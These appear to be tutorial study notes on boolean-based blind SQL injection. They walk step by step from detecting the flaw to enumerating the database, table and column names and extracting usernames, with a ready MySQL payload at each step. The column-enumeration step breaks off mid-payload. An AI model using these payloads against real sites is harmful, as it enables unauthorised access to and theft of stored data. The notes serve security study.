# 🔐 Blind SQL Injection — Boolean-Based (Complete Study Notes)

## 📚 Topic
**Blind SQL Injection (Boolean-Based)**

## 🎯 Objective

Learn how attackers extract database information when the application does not display SQL errors or query results.

Instead of seeing data directly, attackers rely on:

- TRUE / FALSE conditions
- Page response differences

---

# 🧠 Blind SQL Injection Workflow

1 Detect SQL Injection  
2 Confirm Boolean behavior  
3 Identify DBMS  
4 Find database length  
5 Extract database name  
6 Count tables  
7 Find table name length  
8 Enumerate table names  
9 Count columns  
10 Find column name length  
11 Enumerate column names  
12 Find data length  
13 Extract sensitive data  

---

# 1️⃣ Detect SQL Injection

Example URL

http://target.com/product?id=1

Test payload

1'

Possible result

- SQL error
- Page response change

This indicates possible SQL Injection.

---

# 2️⃣ Confirm Boolean-Based Injection

TRUE condition

1' AND 1=1-- -

FALSE condition

1' AND 1=2-- -

Observation

TRUE → Normal page  
FALSE → Different page

This confirms Boolean-Based SQL Injection.

---

# 3️⃣ DBMS Fingerprinting

Different DBMS use different functions.

MySQL → database()  
PostgreSQL → current_database()  
MSSQL → DB_NAME()

Example test

' AND LENGTH(database())>0-- -

---

# 4️⃣ Database Length Detection

Determine number of characters in database name.

Example

' AND LENGTH(database())=8-- -

If TRUE

database length = 8

---

# 5️⃣ Database Name Extraction

Using SUBSTRING() and ASCII()

Example

' AND ASCII(SUBSTRING(database(),1,1))=115-- -

ASCII 115 = s

Continue until full database name is extracted.

Example result

security

---

# 6️⃣ Table Count

Determine total tables in the database.

Example

' AND (SELECT COUNT(table_name)
FROM information_schema.tables
WHERE table_schema=database())=5-- -

---

# 7️⃣ Table Name Length

Determine length of a table name.

Example

' AND LENGTH(
(SELECT table_name
FROM information_schema.tables
WHERE table_schema=database()
LIMIT 0,1)
)=5-- -

If TRUE

table name length = 5

---

# 8️⃣ Table Enumeration

Extract table names using SUBSTRING and ASCII.

Example

' AND ASCII(SUBSTRING(
(SELECT table_name
FROM information_schema.tables
WHERE table_schema=database()
LIMIT 0,1),1,1))=117-- -

Example result

users

---

# 9️⃣ Column Count

Determine number of columns in a table.

Example

' AND (SELECT COUNT(column_name)
FROM information_schema.columns
WHERE table_name='users')=3-- -

---

# 🔟 Column Name Length

Determine length of a column name.

Example

' AND LENGTH(
(SELECT column_name
FROM information_schema.columns
WHERE table_name='users'
LIMIT 0,1)
)=2-- -

Example result

id

# 1️⃣1️⃣ Column Enumeration

Extract column names.

Example

' AND ASCII(SUBSTRING(

# 1️⃣2️⃣ Data Length

Determine length of sensitive data.

Example

' AND LENGTH(
(SELECT username FROM users LIMIT 0,1)
)=5-- -

Result

admin

Length

5

---

# 1️⃣3️⃣ Data Extraction

Extract actual data from database.

Example

' AND ASCII(SUBSTRING(
(SELECT username FROM users LIMIT 0,1),1,1))=97-- -

Example result

admin

# 🔧 Core Functions Used

LENGTH() → Determine string length  
SUBSTRING() → Extract specific character  
ASCII() → Convert character to numeric value  
COUNT() → Count tables or columns  
LIMIT → Select specific row  
database() → Get current database name  

---

# 🧩 Boolean Operators

AND → Combine conditions  
OR → Alternative condition  
= → Equality comparison  
> < → Range comparison  

---

# 📌 Extraction Logic

count → length → characters

Example workflow

column count → 3  
column length → 8  
column characters → username  

---

# 🔎 Important SQL Injection Concepts

### SUBSTRING()

Extract part of a string.

Example

SUBSTRING(database(),1,1)

Meaning

first character of database name

---

### ASCII()

Convert character to numeric value.

Example

ASCII('a') = 97

---

### LIMIT

Used to select a specific row.

Example

LIMIT 0,1

Meaning

first row

LIMIT 1,1 → second row  
LIMIT 2,1 → third row  

---

# ⚡ Binary Search Extraction

Binary search reduces the number of requests needed to extract characters.

Example

ASCII(SUBSTRING(database(),1,1)) > 109

If TRUE → character is greater than m  
If FALSE → character is before m  

Example extraction flow

> m  
> t  
> p  
> r  
= s  

Normal brute force

~26 requests

Binary search

~5 requests
